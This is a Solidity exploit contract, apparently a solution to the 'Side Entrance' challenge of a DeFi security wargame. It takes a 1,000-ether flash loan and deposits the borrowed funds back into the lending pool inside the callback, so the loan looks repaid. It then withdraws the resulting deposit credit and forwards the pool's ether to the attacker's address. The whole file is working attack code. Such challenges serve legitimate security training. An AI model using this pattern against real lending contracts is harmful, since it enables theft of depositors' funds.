pragma solidity 0.8.16;

import "./SideEntranceLenderPool.sol";
contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
    address private attacker;
    constructor() payable {
        attacker = msg.sender;
    }

    function flashLoanLendingPool(address target) external {
        SideEntranceLenderPool(target).flashLoan(1_000 ether);
    }

    function withdrawLendingPool(address target) external {
        SideEntranceLenderPool(target).withdraw();
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {
        payable(attacker).call{value: address(this).balance}("");
    }
}